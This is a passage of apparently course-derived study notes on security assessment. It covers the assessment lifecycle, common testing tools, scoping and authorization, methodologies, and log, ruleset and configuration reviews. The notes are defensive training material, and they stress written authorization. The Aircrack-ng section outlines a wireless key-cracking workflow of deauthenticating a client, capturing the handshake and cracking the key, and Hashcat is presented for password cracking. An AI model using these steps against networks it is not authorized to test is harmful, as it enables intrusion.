		○ CIA Triad Influence

			§ The organization’s priorities around Confidentiality, Integrity, and Availability should shape the pen test goals.

			§ Confidentiality-focused goals → Stealing sensitive data (customer records, IP).

			§ Integrity-focused goals → Demonstrating unauthorized changes to systems or data.

			§ Availability-focused goals → Should be avoided, since disrupting production systems during a pen test causes real damage.

		○ Ethical and Professional Considerations

			§ Sensitive data compromised during a pen test must remain secret under non-disclosure agreements or professional codes of ethics.

			§ Exploiting integrity flaws carries risks of cleanup and potential production incidents.

			§ Exploiting availability vulnerabilities is unethical and equivalent to causing real harm.

		○ Defining Scope Based on Business Priorities

			§ The scope of the penetration test should align with what matters most to the organization.

			§ Proper scoping ensures tests are relevant, valuable, and safe.



The Security Assessment Lifecycle

	• The security assessment lifecycle integrates all five assessment types (risk, security controls, compliance, vulnerability, penetration) into a continuous, cyclical process. Each assessment feeds into the next, creating efficiencies and stronger results, while ensuring organizations continuously identify, prioritize, and mitigate risks.

	• Key Concepts

		○ Integration of Assessments

			§ Conducting all five assessments provides comprehensive visibility into exposures.

			§ They build on one another to improve efficiency and quality.



		○ Order of Assessments (Lifecycle Flow)

			§ Risk Assessment → Identify risks, likelihood, impact, and leadership’s risk appetite.

			§ Security Controls Assessment → Take stock of existing controls; evaluate their strength, cost, and complexity in relation to identified risks.

			§ Compliance Assessment → Use security controls assessment output to demonstrate alignment with external requirements (e.g., PCI DSS, HIPAA).

			§ Vulnerability Assessment → Use automated/manual tools to identify exploitable weaknesses across hosts, applications, and devices.

			§ Penetration Test → Attempt to exploit weaknesses, validate resilience, and simulate real-world attacks.

		○ Cyclical Process

			§ Findings from penetration testing feed into the next risk assessment, restarting the cycle.

			§ Security is continuous—“not a destination, but a journey.”

		○ Benefits of Lifecycle Approach

			§ Identifies likely threats and exposures.

			§ Ensures security controls are appropriate and effective.

			§ Demonstrates compliance to regulators and industry bodies.

			§ Tests organizational resilience against real attacks.

			§ Shifts focus from incident response to business as usual, by staying ahead of attackers.

#### Your Testing Environment



The Security Tester's Toolkit

	• Before starting any security assessment, a tester should prepare a well-organized toolkit (“Mise en Place”). Having the right tools ready, knowing how to use them, and understanding their output is essential for effective, efficient, and professional security testing.

	• Key Concepts

		○ Mise en Place for Security Testing

			§ Borrowed from cooking: “everything in its place.”

			§ Applied to security → prepare your toolkit before testing begins.

			§ Avoids wasting time or missing important steps during assessments.

		○ Toolkit Preparation

			§ Assemble tools before running scans or testing systems.

			§ Know:

				□ Where to find each tool.

				□ How to run it (commands, configurations).

				□ How to interpret its results.

		○ Role in Assessments

			§ Tool choice depends on pre-assessment or pre-engagement planning.

			§ Different assessments may require different tools, depending on scope, goals, and systems in play.

		○ Learning by Doing

			§ More than just knowing names of tools—testers should see them in action.

			§ Hands-on familiarity ensures confidence and competence during real engagements.

		○ Growth and Customization

			§ Instructor shares personal go-to tools but encourages testers to:

				□ Adapt and expand their toolkit over time.

				□ Add tools as they gain experience and maturity in the field.



Kali Linux

	• Kali Linux is a specialized Linux distribution widely used for penetration testing, but it also supports other types of security assessments. It comes preloaded with a wide range of security tools and can be run as a full operating system or as a virtual machine.

	• Key Concepts

		○ What is Kali Linux?

			§ A penetration testing Linux distribution.

			§ One of the most well-known and widely used in cybersecurity.

		○ Use Cases

			§ Primarily for penetration testing.

			§ Also supports:

				□ Vulnerability assessments.

				□ Certain types of security control assessments.

		○ Features

			§ Fully functional Linux operating system.

			§ Comes preloaded with numerous security tools (ready to use out of the box).

			§ Many downloads can be used as a full replacement OS.

		



Nmap

	• Nmap (Network Mapper) is a powerful and widely used tool for network discovery and scanning. It is included by default in Kali Linux, easy to start using, but offers advanced functionality that requires deeper learning and practice.

	• Key Concepts

		○ What is Nmap?

			§ Stands for Network Mapper.

			§ A tool used to identify systems on a network (host discovery, port scanning, service detection, etc.).

		○ Availability

			§ Downloadable from nmap.org.

			§ Zenmap: GUI-based version available for Windows users.

			§ In Kali Linux, Nmap is preinstalled—no setup needed.

		○ Ease of Use vs. Depth

			§ Simple to start: open terminal, type nmap.

			§ Difficult to master: advanced options and techniques take extensive practice.

			§ Known for being a tool that “takes a moment to learn and a lifetime to master.”

		○ Learning Resources

			§ The Nmap Cheat Sheet (highon.coffee) is recommended for practical, repeatable commands.

				□ https://highon.coffee/blog/nmap-cheat-sheet/



Nexxus

	• Nessus is a widely used host vulnerability scanner that goes beyond identifying active systems (like Nmap does) to detect specific technical vulnerabilities attackers could exploit. It is offered by Tenable in multiple versions, including a free option suitable for personal labs.

	• Key Concepts

		○ Purpose of Nessus

			§ Nmap: identifies live hosts and services.

			§ Nessus: identifies technical vulnerabilities on those hosts (missing patches, misconfigurations, weaknesses).

			§ Helps assess what attackers could actually exploit.

		○ Availability and Versions

			§ Provided by Tenable (tenable.com).

			§ Comes in different deployment models:

				□ Cloud-based scanners.

				□ Locally installed scanners.

			§ For training: Nessus Essentials (free edition).

		○ Nessus Essentials

			§ Can scan up to 16 IP addresses.

			§ Designed for home labs and learning purposes.

			§ Good starting point for security testers.

		○ Setup Requirements

			§ Registration with Tenable required (name + email).

			§ Activation code sent via email.

			§ Installer available for multiple OS options.

			§ Setup follows a simple “next, next, finish” process.

			§ If you choose not to register, you can still follow course demos.



Wireshark

	• Wireshark is a widely used tool for capturing and analyzing network packets, essential for network troubleshooting and security assessments. It allows testers to monitor traffic on specific network adapters, filter captures, and analyze communication flows in detail.

	• Key Concepts

		○ What is Wireshark?

			§ A packet capture and analysis tool.

			§ Available at wireshark.org, also preinstalled in Kali Linux.

		○ How It Works

			§ Displays all available network adapters on the system.

			§ Selecting an adapter (e.g., eth0 in Kali for the primary virtual adapter) starts traffic capture.

			§ The “any” adapter captures from all active adapters at once, but this may be messy or confusing.

		○ Capturing Traffic

			§ When capture starts, network activity is displayed visually (like a “heartbeat monitor”).

			§ Packets are saved to the local testing system for analysis.

			§ You can:

				□ Filter in real time while capturing.

				□ Capture everything and filter offline later (recommended for accuracy).

		○ Filtering Benefits

			§ Filters help narrow down relevant traffic (e.g., exclude your own machine’s traffic).

			§ However, depending on the test scenario, filtering out too much may miss important data.

			§ Best practice: capture all first, filter later for flexibility.

		○ Adaptability

			§ Users can tweak capture configurations as they gain experience.

			§ Wireshark’s flexibility makes it useful for both beginner testers and advanced analysts.



Lynis

	• Lynis is a security configuration assessment tool for Linux systems that evaluates system hardening and compliance. It provides both quick local scans and enterprise-level multi-system assessments, producing a hardening index score and detailed reports for remediation.

	• Key Concepts

		○ Purpose of Lynis

			§ Used for security configuration assessments on Linux systems.

			§ Validates how well a system is hardened against attacks.

		○ Versions of Lynis

			§ Open Source Version

				□ Lightweight (≈1000 lines of shell code).

				□ Suitable for scanning a single local/remote server or a single Docker file.

			§ Enterprise Version

				□ Paid.

				□ Designed for scanning multiple systems at scale.

		○ Assessment Output

			§ Onscreen results are color-coded for quick readability.

			§ Generates a hardening index (0–100) → a “How secure is this system?” score.

			§ Full scan results saved in /var/log/Lynis-report.dat.

		○ Customization

			§ After initial use, testers can modify the default.prf preferences file.

			§ Allows tailoring of which checks Lynis should perform.

		○ Integration with Benchmarks

			§ CIS Benchmarks (Center for Internet Security) can be used to interpret Lynis results.

			§ Provides industry-aligned guidance for improving configurations.

		



CIS-CAT Lite

	• CIS-CAT Lite is a free tool from the Center for Internet Security (CIS) that scans systems for security configuration weaknesses based on CIS Benchmarks. While limited in scope compared to the Pro version, it provides a starting point for organizations to assess compliance with secure configuration standards.

	• Key Concepts

		○ CIS Benchmarks

			§ Comprehensive technical guides for securing systems.

			§ Widely recognized as best practices for configuration hardening.

		○ CIS-CAT (Configuration Assessment Tool)

			§ Nessus vs. CIS-CAT:

				□ Nessus → scans for vulnerabilities (software flaws, missing patches).

				□ CIS-CAT → scans for configuration weaknesses (settings that don’t align with CIS Benchmarks).

		○ CIS-CAT Lite (Free Version)

			§ Available to registered users after providing contact info.

			§ Limited functionality: can only scan Windows 10, Ubuntu Linux, and Google Chrome.

			§ Serves as an introductory tool to show how the Pro version works.

		○ CIS-CAT Pro (Paid Version)

			§ Supports all CIS Benchmarks across many technologies.

			§ Includes CIS WorkBench → allows customization of benchmarks to match internal standards.

		○ Technical Requirements

			§ CIS-CAT Lite is a Java application.

			§ Requires Java to run → potential security concerns since Java has been a frequent target of exploits.

			§ Note: Java is preinstalled on Kali Linux, but installing it elsewhere should be done with caution.



Aircrack-ng

	• Aircrack-ng is a suite of tools used for testing the security of wireless networks. It enables penetration testers to analyze wireless encryption, capture traffic, and attempt to crack WEP, WPA, and WPA2 keys (with WPA3 being generally secure unless misconfigured).

	• Key Concepts

		○ Purpose of Aircrack-ng

			§ Designed for wireless network security testing.

			§ Commonly used in penetration tests where wireless is in scope.

		○ Setup Requirements

			§ Requires a compatible wireless network adapter (e.g., Alfa adapters with Realtek chipset).

			§ Kali Linux provides guidance on driver troubleshooting if needed.

		○ Encryption Detection \& Cracking

			§ Identifies wireless encryption types: Open (unencrypted), WEP, WPA, WPA2.

			§ WEP, WPA, WPA2 can potentially be cracked.

			§ WPA3 is considered secure unless misconfigured.

		○ Core Tools in the Suite

			§ airmon-ng → Starts a virtual wireless adapter for capturing traffic.

			§ airodump-ng → Monitors nearby access points (APs) and clients, can filter by MAC/hardware addresses.

			§ aireplay-ng → Launches deauthentication attacks, forcing clients to disconnect and reconnect.

			§ aircrack-ng → Attempts to crack the captured encryption keys using the 4-way handshake exchanged during reconnection.

		○ Workflow Summary

			§ Start monitoring with airmon-ng.

			§ Scan networks and clients with airodump-ng.

			§ Use aireplay-ng to deauthenticate a client.

			§ Capture the 4-way handshake during reconnection.

			§ Run aircrack-ng to attempt decryption of WEP/WPA/WPA2 keys.

		○ Learning Resources

			§ Official tutorials and guides at aircrack-ng.org.

			§ Step-by-step instructions maintained by developers.



Hashcat

	• Hashcat is one of the fastest and most powerful password-cracking tools available. It supports hundreds of hash types, is included in Kali Linux by default, and is highly effective in penetration testing when testers understand the context of the password source.

	• Key Concept

		○ Password Cracking Tools Landscape

			• Other well-known tools: John the Ripper, THC Hydra, L0phtCrack, RainbowCrack.

			• Hashcat stands out as one of the fastest and most capable.

		○ Why Hashcat is Popular

			• Installed by default on Kali Linux.

			• Extremely fast performance compared to alternatives.

			• Supports 350+ hash types, including widely used algorithms like MD5 and NTLM.

		○ Using Hashcat

			• Command: hashcat -h displays the help file, showing available options and capabilities.

			• The tool’s power lies in its wide range of modes, attack strategies, and optimizations.

		○ Success Factors in Cracking

			• Cracking effectiveness improves the more you know about the password source (e.g., complexity rules, likely patterns, wordlists).

			• Context and strategy matter as much as tool speed.

		○ Learning Approach

			• Instructor plans a demo to show Hashcat in action.

			• Hands-on practice helps reveal its full potential.



ÒWASP ZAP

	• OWASP ZAP (Zed Attack Proxy) is an open-source web application security scanner sponsored by OWASP (and more recently by Checkmarx). It is designed to identify vulnerabilities in web applications, offering both automated scans and manual testing tools, but must be used carefully since web app scanners can sometimes disrupt target applications.

	• Key Concepts

		○ Difference from Host Scanners

			§ Host vulnerability scanners:

				□ Signature-based → yes/no checks for known issues.

				□ Safer, less likely to disrupt systems.

			§ Web application scanners:

				□ More open-ended, simulate malicious user behavior.

				□ Higher risk of breaking or disrupting applications.

		○ Precautions in Web App Scanning

			§ Always test against non-production applications first.

			§ Adjust configurations to avoid unnecessary damage before testing production.

		○ Role of OWASP

			§ OWASP (Open Web Application Security Project): nonprofit dedicated to improving web app security.

			§ Provides open-source projects:

				□ Guides and standards (e.g., testing guides).

				□ Tools for automated and manual testing.

		○ OWASP ZAP

			§ Open-source web application security scanner.

			§ Features:

				□ Automated scanning for common vulnerabilities.

				□ Manual testing tools to support penetration testing.

			§ Installed by default in Kali Linux.

			§ Info and downloads at zaproxy.org.

		○ Project Sponsorship Update

			§ As of September 2024, ZAP’s dev team partnered with Checkmarx, who now sponsors the project.

			§ OWASP continues to maintain other projects, including intentionally vulnerable apps (e.g., Juice Shop) for training purposes.

		○ Training Use Case

			§ The course demonstrates ZAP by scanning Juice Shop, a deliberately vulnerable app for hands-on learning.



Prowler

	• Prowler is a cloud security posture management (CSPM) tool that checks cloud environments against security best practices and compliance requirements. It supports multiple cloud platforms, provides hundreds of checks based on dozens of frameworks, and is available as both an open-source and commercial solution.

	• Key Concepts

		○ Purpose of Prowler

			§ Authenticates to cloud environments.

			§ Runs security and compliance checks.

			§ Compares configurations against best practices and compliance frameworks.

		○ Availability

			§ Open source version (free, with CLI and GUI options).

			§ Commercial product with full support.

		○ Cloud and Platform Support

			§ Major providers: AWS, Azure, Google Cloud, Kubernetes, Microsoft 365

			§ Others: GitHub, NHN Cloud (NHN unofficial).

		○ Compliance and Security Standards

			§ Built around well-known frameworks:

				□ CIS Critical Security Controls.

				□ NIST Cybersecurity Framework.

				□ HIPAA, GDPR, SOC 2, etc.

			§ For AWS: ~600 unique checks across 40 compliance frameworks.

		○ Interfaces

			§ Command-line interface (CLI) for advanced users.

			§ Web-based GUI for those preferring visual management.

			§ Both available in the open-source version.

		○ Authentication Challenges

			§ The most complex part of setup is configuring authentication securely.

			§ Since it connects to sensitive cloud environments, proper configuration is critical.

			§ Supports multiple authentication methods, including MFA (multi-factor authentication).

			§ Documentation and guides at docs.prowler.com.





#### Planning Your Assessment



Understanding Your Assessment

	• Defining and confirming the scope of a security assessment is critical. It ensures you know which systems to test, keeps the client satisfied, and most importantly, protects you from legal or operational risks when working with third-party environments.

	• Key Concepts

		○ Impact of Assessment Type

			§ The type of assessment (risk, controls, compliance, vulnerability, penetration) influences how you scope the work.

			§ Each assessment type has different goals, targets, and requirements.

		○ Client Considerations

			§ The requester is always the client—whether internal or external.

			§ A happy client is more likely to bring repeat work, so communication and alignment are key.

		○ Defining Systems in Scope

			§ Ask for a list of systems to include:

				□ Hostnames.

				□ IP addresses.

				□ URLs.

			§ If only IP ranges are provided, you’ll need to determine which hosts are live.

		○ Authorization is Critical

			§ Confirm the client has authority to approve testing.

			§ Safe scenarios: client-owned on-premises systems.

			§ Risky scenarios: third-party systems (e.g., Salesforce, ServiceNow, AWS, Azure).

				□ Even if the client assumes permission, testing without explicit third-party approval can cause problems.

			§ Always get written authorization before testing.

		○ Risk Avoidance

			§ Testing third-party systems without approval can cause:

				□ Service disruption.

				□ Legal and compliance issues.

			§ Proper scoping and authorization prevent unnecessary risks.



Improving Over Time

	• Security assessments should be done strategically and consistently over time, not just tactically. Without a documented, repeatable methodology, organizations risk producing inconsistent results that prevent them from accurately measuring security improvements.

	• Key Concepts

		○ Tactical vs. Strategic Thinking

			§ Tactical: Treating each assessment as a one-time snapshot.

			§ Strategic: Looking at progress over time to measure security maturity.

		○ Importance of Measuring Improvement

			§ Security maturity requires tracking progress.

			§ Consistent assessments provide reliable data to demonstrate improvements and ROI to leadership.

		○ Scenario of Inconsistency

			§ Year 1: Experienced pentester (Dave) → focused on exploitation.

			§ Year 2: Vulnerability scanner expert (Deborah) → relied heavily on automated scanning.

			§ Year 3: Inexperienced consultant (Dylan) → used a generic checklist with limited expertise.

			§ Outcome: Reports are inconsistent, making it impossible to measure improvement across the three years.

		○ NIST Guidance

			§ NIST SP 800-115 (Technical Guide to Information Security Testing and Assessments) recommends:

				□ Documented methodologies.

				□ Repeatable processes.

			§ These ensure consistency, reliability, and measurable results across assessments.

		○ Avoiding the Pitfall

			§ Use a standardized, repeatable methodology.

			§ Select tools and approaches that align with organizational goals, not just tester preference.

			§ Focus on producing consistent, measurable outputs that leadership can track year over year.



Selecting Your Methodology

	• The choice of a security assessment methodology depends on the type of assessment being conducted. Different frameworks and standards provide structured approaches for risk, controls, and compliance assessments, helping organizations ensure consistency, effectiveness, and regulatory alignment.

	• Key Concepts

		○ Risk Assessment Methodologies

			§ NIST SP 800-30 Rev. 1 → Guide for conducting risk assessments; primarily qualitative.

			§ FAIR (Factor Analysis of Information Risk) → Offers a quantitative approach to assessing risk.

		○ Security Controls Assessment Methodologies

			§ NIST Cybersecurity Framework (CSF) → Comprehensive control set centered on governance.

			§ ISO/IEC 27002:2022 → Code of practice for information security controls; provides detailed control catalog.

		○ Compliance Assessments

			§ Driven by specific data types and regulatory requirements.

			§ Examples:

				□ PCI DSS → Applies to organizations handling credit card data.

					® Requirements vary depending on the volume of transactions.

					® Determines whether organizations can self-assess or must hire a certified third party.

				□ HIPAA (1996) → Applies to U.S. organizations handling ePHI (electronically protected health information).

					® Requires a security risk assessment aligned with HIPAA-mandated controls.

		○ Frequency and Scope of Compliance Assessments

			§ Determined by factors such as:

				□ Type of data processed.

				□ Volume of transactions or records handled.

				□ Applicable regulatory mandates.

		○ Unified Compliance Framework (UCF)

			§ Maps 800+ authority documents.

			§ Helps organizations identify which controls must be tested to achieve compliance with multiple overlapping standards/regulations.



Selecting Your Tools

	• When conducting vulnerability assessments (or penetration tests), the choice of tools and methodologies must align with the type of assessment, client needs, and consistency goals. A mix of commercial and open-source tools are available, and testers must also decide between authenticated vs. unauthenticated scans while ensuring consistent use of methodologies for measurable results over time.

	• Key Concepts

		○ Tool Categories for Vulnerability Assessments

			§ Host Vulnerability Scanners:

				□ Commercial: Nessus, Qualys VMDR.

				□ pen-source: OpenVAS (originally forked from Nessus).

			§ Web Application Vulnerability Scanners:

				□ Commercial: Veracode, AppScan, Sentinel, Acunetix, Checkmarx, Invicti (formerly Netsparker).

				□ Open-source / Community favorites: Burp Suite, OWASP ZAP.

		○ Authenticated vs. Unauthenticated Scans

			§ Unauthenticated scans:

				□ Simulate an outsider’s perspective.

				□ Safer for production systems but less detailed.

			§ Authenticated scans:

				□ Simulate a trusted insider’s perspective.

				□ Provide more accurate, detailed results.

				□ Carry higher risk of impacting production systems.

			§ Best practices:

				□ Run unauthenticated scans on internet-facing systems.

				□ Run authenticated scans on internal production hosts and non-production app instances.

		○ Penetration Testing Methodologies

			§ Tester skill and experience affect methodology variance.

			§ Common standards:

				□ PTES (Penetration Testing Execution Standard) → widely recommended.

				□ OSSTMM (Open-Source Security Testing Methodology Manual) → robust resource.

		○ Manual Testing Resources

			§ OWASP Web Security Testing Guide → manual testing for web apps.

			§ OWASP Mobile Security Testing Guide → manual testing for mobile apps.

			§ CIS Benchmarks → detailed configuration guidance for systems, networks, and databases.

		○ Consistency Across Assessments

			§ Select methodologies that align with client needs and expectations.

			§ Use the same methodologies across multiple assessments to:

				□ Ensure consistent results.

				□ Enable tracking of progress over time.



Basic Assessment Tools

	• Once scope and methodology are set, choosing tools for security assessments is straightforward. The right choice depends on budget, complexity, and collaboration needs, with different tools fitting risk assessments, security controls assessments, and ISO-aligned organizations.

	• Key Concepts

		○ Factors in Tool Selection

			§ Budget: What can the organization afford?

			§ Complexity: How steep is the learning curve?

			§ Collaboration: Is the assessment individual or team-based?

		○ Tools for Risk Assessments

			§ Often don’t require complex automated tools.

			§ Many consultants rely on custom spreadsheet tools with built-in scoring.

			§ Example: SimpleRisk → offers pre-configured virtual machines for easy setup, plus a hosted option.

		○ Tools for Security Controls Assessments

			§ Traditionally done with spreadsheets to capture responses and insights.

			§ Recently, some have moved to SaaS-based solutions.

			§ Emphasis is on Q\&A discussions with staff responsible for controls.

		○ ISO-Specific Resources

			§ ISO 27K Toolkit (ISO27001security.com): free collection of documents, spreadsheets, PowerPoints, etc.

			§ Helps assess against ISO/IEC 27001 and 27002.

			§ Good starter resource before purchasing the official standards.

			§ Official standards available at iso.org.



Advanced Assessments Tools

	• Advanced assessment tools extend beyond basic scanners and are often tied to specific compliance requirements, penetration testing methodologies, or web application testing. Many authoritative organizations and community-driven projects provide curated lists of tools that security testers should reference and use.

	• Key Concepts

		○ Compliance Assessment Tools

			§ Often provided by the compliance authority itself.

			§ Examples:

				□ PCI DSS → self-assessment questionnaires available at pcisecuritystandards.org.

				□ HIPAA → security risk assessment tool available from OCR/ONC (free download).

		○ Vulnerability \& Penetration Testing Tools

			§ Best starting point: methodology guides.

			§ PTES (Penetration Testing Execution Standard) → references technical tools at pentest-standard.org.

			§ OSSTMM (Open Source Security Testing Methodology Manual) → additional resource at isecom.org.

		○ Web Application Testing Tools

			§ OWASP provides curated lists of application security testing tools.

			§ These lists are among the most comprehensive and up-to-date for web app security.

			§ Should be bookmarked as a go-to resource.

		○ General Security Tools

			§ SecTools.org → contains a “Top 125 Network Security Tools” list.

			§ While somewhat dated, many tools listed remain highly relevant.

			§ Useful for rounding out knowledge of network and security testing tools.



#### Review Techniques



Documentation Review

	• A documentation review evaluates whether an organization’s security documentation (policies, standards, guidelines, and procedures) is complete, cohesive, reasonable, and actually implemented in practice. It ensures alignment with compliance requirements, control frameworks, and practical security goals.

	• Key Concepts

		○ ISACA’s Four Key Documentation Types

			§ Policies → High-level principles the organization commits to.

			§ Standards → Mandatory requirements to meet policy goals.

			§ Guidelines → Flexible instructions for areas not fully covered by standards (often technology-specific).

			§ Procedures → Step-by-step, prescriptive instructions for implementation.

		○ Relationships Among Documents

			§ Example: Mobile Security

				□ Policy → Secure use of mobile devices.

				□ Standards → Required device/app security settings.

				□ Guidelines → Supplemental advice for new OS or app versions.

				□ Procedures → Instructions for applying those settings.

			§ Cohesiveness is critical: remediation should start with policies and flow downward.

		○ Completeness of Documentation

			§ Documentation requirements depend on:

				□ Compliance obligations.

				□ Selected security control frameworks.

			§ Organizations should compile a list of required docs based on standards/regulations.

		○ Criteria to Evaluate Documents

			§ Last review date.

			§ Reviewer and approver (sign-off).

			§ Scope definition.

			§ Policy alignment with reasonable security practices.

			§ Technical standards aligned with best practices (e.g., CIS Benchmarks → adjusted to avoid over-implementation or unnecessary cost).

		○ Critical Review Question

			§ “Are they really doing this?”

			§ Many organizations create documentation but never implement it, leading to a false sense of security.

		○ Supporting Documentation to Review

			§ Architectural diagrams (Visio, Figma, etc.).

			§ System Security Plans (SSPs) → Narratives on how controls are implemented.

			§ Third-party contracts → Ensure data protection clauses are included.

			§ Security incident response plans → Documented and tested.

			§ Disaster recovery \& business continuity plans → Preparedness for operational disruptions.



Log Review

	• Log reviews are critical for visibility into system and user activity, threat detection, and incident investigation. Logs should be collected and configured for security value—not just for compliance—and reviews should ensure both proper activation and configuration of logging across systems.

	• Key Concepts

		○ Purpose of Logs

			§ Not just for compliance—logs must provide security insight.

			§ Offer visibility into:

				□ System-to-system communication.

				□ User activities within applications.

				□ Potential threats or suspicious events.

		○ Value of Log Analysis

			§ Helps detect:

				□ Malicious login attempts from suspicious IPs.

				□ Reconnaissance activity before an attack.

				□ Unauthorized privilege escalations (e.g., new global admin at odd hours).

		○ Critical Log Settings to Review

			§ Authentication attempts: especially failed and sensitive login attempts.

			§ Privileged account activity.

			§ System/service startup and shutdown events.

			§ Network metadata: source IP, destination IP, date, time.

			§ Goal: enough context to identify what happened, where, and when.

		○ Documentation to Review First

			§ Logging and monitoring policies and standards, focusing on:

				□ Activation → Which systems are required to have logging enabled?

				□ Configuration → What specific log settings must be applied?

		○ Security vs. Compliance

			§ Compliance requirements provide a baseline, but compliance alone is insufficient.

			§ Effective log management requires strategic collection and analysis.



Log Management Tools

	• Effective log management goes beyond collecting server logs—it requires aggregating multiple log sources, centralizing storage, ensuring consistency, and using tools (log management or SIEM) to analyze data. Without proper tools and retention, organizations risk losing critical forensic evidence during incidents.

	• Key Concept

		○ Beyond Server Logs

			§ Server OS logs are important, but insufficient.

			§ Organizations should also collect:

				□ Application logs

				□ Database logs

				□ Web server logs

				□ Endpoint activity logs

		○ Challenges in Log Management

			§ Storage requirements can be massive in large enterprises.

			§ Logs should be stored on a centralized server.

			§ Time synchronization across systems is critical.

			§ Retention policies must satisfy:

				□ Compliance needs.

				□ Incident response/forensics requirements.

		○ Log Management vs. SIEM

			§ Log Management System: Collects, stores, and organizes logs.

			§ SIEM (Security Information and Event Management): Adds correlation, analysis, and alerting.

		○ Common Tools

			§ Commercial solutions:

				□ Splunk

				□ Qradar

				□ LogRhythm

				□ AlienVault

			§ Open-source solutions:

				□ Syslog (native Linux logging).

				□ Syslog-ng (enhanced version).

				□ Graylog.

				□ ELK Stack (Elasticsearch, Logstash, Kibana).

		○ Practical Importance

			§ Without consistent log collection and retention, forensic investigations fail.

			§ Example: Healthcare org incident → logs incomplete, inconsistent, or expired.

			§ Result: Inability to reconstruct attack timeline.

		○ Recommended Resource

			§ Critical Log Review Checklist for Security Incidents (Lenny Zeltser \& Anton Chuvakin).

			§ Free resource: zeltser.com/cheat-sheets/.

			§ Provides practical guidance on what log data is most valuable during incidents.



Ruleset Review

	• A ruleset review analyzes the configuration of network security devices (firewalls, routers, IDS/IPS) to ensure rules enforce security best practices, reduce unnecessary complexity, and align with business needs. Proper configuration is essential to prevent misconfigurations that create false security or unnecessary risk.

	• Key Concept

		○ Purpose of Ruleset Review

			§ Assess configurations of routers, firewalls, IDS, IPS.

			§ Rules act as access control settings—they determine what traffic is allowed or denied.

		○ Best Practice – Default Deny

			§ Leading practice: Deny all traffic by default, then explicitly allow based on business needs.

			§ Provides stronger security but requires deeper business understanding and administrative effort.

		○ Example of Misconfiguration

			§ Case: A firewall with a single rule, “Permit IP Any Any”.

			§ Technically met partner compliance, but provided zero security value.

		○ Key Review Considerations

			§ Is Deny All present and properly placed in the ruleset?

				□ Too high in the list blocks all traffic, including business-critical.

			§ Are the rules necessary? (Remove clutter and unused rules).

			§ Do rules follow the principle of least privilege?

				□ Limit access to specific IPs/ports instead of broad permissions.

			§ Ensure specific rules take precedence over general ones.

			§ Close unnecessary ports, especially admin services like SSH and RDP.

			§ Ensure documented requirements exist for all rules.

			§ No backdoors or bypasses should be allowed.

		○ IDS/IPS Rule Review

			§ Disable or remove unnecessary signatures to:

				□ Reduce log storage burden.

				□ Minimize false positives.

			§ Fine-tune required signatures so alerts are actionable.

		○ Tools for Review \& Testing

			§ Use Nmap → to scan for open ports and validate firewall behavior.

			§ Nipper → historically a go-to firewall ruleset auditing tool.

				□ Still effective but no longer free.



System Configuration Review

	• System configuration reviews are essential but resource-intensive security assessment tasks. Automation through scanning tools (like Lynis or CIS-CAT) is critical, and the approach should align with the client’s documented security standards to ensure efficiency and relevance.

	• Key Concepts

		○ Challenge of Manual Reviews

			§ Reviewing configurations across thousands of endpoints manually is nearly impossible.

			§ Automation is essential for scalability and efficiency.

		○ Role of Security Standards

			§ Client’s documented security standards define:

				□ Required/allowed services.

				□ Necessary privileged accounts.

				□ Encryption and security settings.

			§ These should guide what testers look for in a configuration review.

		○ Approach #1: General Scan + Standards Reference

			§ Use tools like Lynis or CIS-CAT.

			§ Identify failures/warnings, then compare against client standards.

			§ Pros: Pinpoints likely high-risk misconfigurations.

			§ Cons: Not a direct one-to-one mapping; may flag items the client already deems unnecessary.

		○ Approach #2: Tailored Technical Policy + Targeted Scan

			§ Build a custom technical policy based on client’s hardening standards.

			§ Use enterprise vulnerability/configuration scanners with authenticated scans.

			§ Pros: More efficient, ensures alignment with client-specific standards.

			§ Cons: Requires access to advanced scanning tech and setup.

		○ Preferred Practices

			§ Start with general tools for broad coverage.

			§ Narrow down findings by validating against client hardening standards.

			§ Use enterprise-grade, policy-driven scans when available for maximum efficiency.



Network Sniffing

	• Network sniffing involves capturing and analyzing network traffic, but its effectiveness depends heavily on timing, placement, and scope. Proper planning ensures meaningful results, such as detecting insecure protocols, unencrypted data, and policy violations.

	• Key Concepts

		○ Time and Duration Matter

			§ The amount of data = directly tied to how long the sniffer runs.

			§ Sniffing at the wrong time skews results:

				□ Before/after office hours → little to no endpoint traffic.

				□ During lunch → personal browsing instead of business activity.

			§ Must align sniffing window with normal business operations.

		○ Placement in the Network

			§ Results depend on which network segment is monitored.

			§ Use client network diagrams to choose the best placement.

			§ Typical placements:

				□ Perimeter → see inbound/outbound traffic.

				□ Behind firewalls → validate filtering rules.

				□ Behind IDS/IPS → confirm alerts/rules fire correctly.

				□ In front of sensitive systems/apps → check principle of least privilege.

				□ On segments requiring encryption → verify compliance.

		○ Data to Look For

			§ Active devices and identifiers (OS, applications).

			§ Services and protocols in use → highlight insecure/prohibited ones (e.g., Telnet).

			§ Unencrypted transmissions, especially sensitive data.

			§ Unencrypted credentials crossing the network.

		○ Preparation Steps

			§ Review network diagrams beforehand.

			§ Discuss with client what “normal” traffic looks like.

			§ Document start/stop times for context in results.



File Integrity Checking

	• File integrity checking (FIC) is a simple concept—comparing a file’s current hash to a trusted hash—but it’s complex to prepare for at scale. It helps detect unauthorized modifications, whether legitimate (patches, upgrades) or malicious (malware tampering). Effective use requires identifying which critical “guarded files” to monitor and implementing appropriate tools.

	• Key Concepts

		○ Core Process

			§ Compare two values: trusted hash vs. current hash.

			§ If the values match → file unchanged.

			§ If they differ → investigate why.

		○ Hashing Functions

			§ Tools use cryptographic hash functions like MD5 or SHA-1 to generate unique digital fingerprints of files.

			§ A hash uniquely identifies a file’s content.

		○ Trusted Hash Baseline

			§ Created when a file is in a known-good state.

			§ Must be updated when legitimate changes (patches, upgrades) occur.

			§ If unexpected changes occur, it may indicate malware tampering.

		○ Challenges of FIC

			§ Easy part: Running checks and comparing values.

			§ Hard part:

				□ Deciding which files to monitor.

				□ Maintaining an accurate, trusted database of hash values.

			§ Guarded Files (examples rarely expected to change)

				□ Windows: explorer.exe → changes may signal compromise.

				□ Linux: /etc/passwd → changes could mean unauthorized account creation.

		○ Enterprise Scale Problem

			§ Thousands of files across many systems makes full coverage impractical.

			§ Best approach: security/system admins define a short, critical list of files.

		○ Tools for File Integrity Monitoring (FIM)

			§ Commercial: Tripwire → popular enterprise solution.

			§ Open-source: OSSEC → host-based intrusion detection with FIM.

			§ Some vulnerability management tools include basic FIM features.

				□ Useful for monitoring a small set of files daily.

				□ Not scalable, but good as a starting point.



#### Identifying Your Targets



Network Discovery

	• Network discovery validates network documentation and firewall rules by identifying live systems and services. It can be done through active scanning (sending probes) or passive scanning (observing traffic), with passive methods being safer for fragile environments like ICS/OT networks.

	• Key Concepts

		○ Purpose of Network Discovery

